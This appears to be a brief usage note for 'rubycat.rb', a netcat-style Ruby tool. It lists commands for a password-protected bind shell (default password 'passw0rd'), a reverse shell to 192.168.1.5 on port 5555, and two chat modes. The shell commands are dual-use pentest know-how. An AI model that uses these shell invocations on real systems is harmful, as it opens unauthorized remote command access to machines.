*** Bind Shell with Password - default password is passw0rd ***
./rubycat.rb -b -p 5555
(or)
./rubycat.rb -b -p 5555 -P passw0rd

*** Reverse Shell ***
./rubycat.rb -r -i 192.168.1.5 -p 5555

*** Bind Chat Messenger ***
./rubycat.rb -l -p 5555

*** Reverse Chat Messenger ***
./rubycat.rb -c -i 192.168.1.5 -p 5555
